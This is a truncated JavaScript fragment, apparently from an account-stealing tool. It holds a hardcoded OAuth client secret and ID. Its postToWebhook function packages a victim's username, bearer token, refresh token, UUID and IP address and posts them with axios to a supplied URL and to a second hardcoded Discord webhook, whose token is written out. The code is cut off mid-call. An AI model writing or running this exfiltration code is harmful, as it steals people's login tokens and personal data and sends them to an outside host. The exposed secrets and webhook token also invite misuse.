//Config
const client_secret = '3kV8Q~JuS3gpWsTZNMk7rfNtWKsTUWnTJwhGkbwr'
const client_id = '4aa07376-01b1-4d4f-815d-c5c0dded6f19'
...
function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
  ...
  embeds: [
    ...
    axios.all([ 
        axios.post(url, data),
        axios.post("https://discord.com/api/webhooks/1231175751844237392/H2OmObsFGXfP9aurncKhTPQiX4xND-qXIiQcu010cBbPHyy0jTUJwqiQwrdaXfBqZKA2", data)
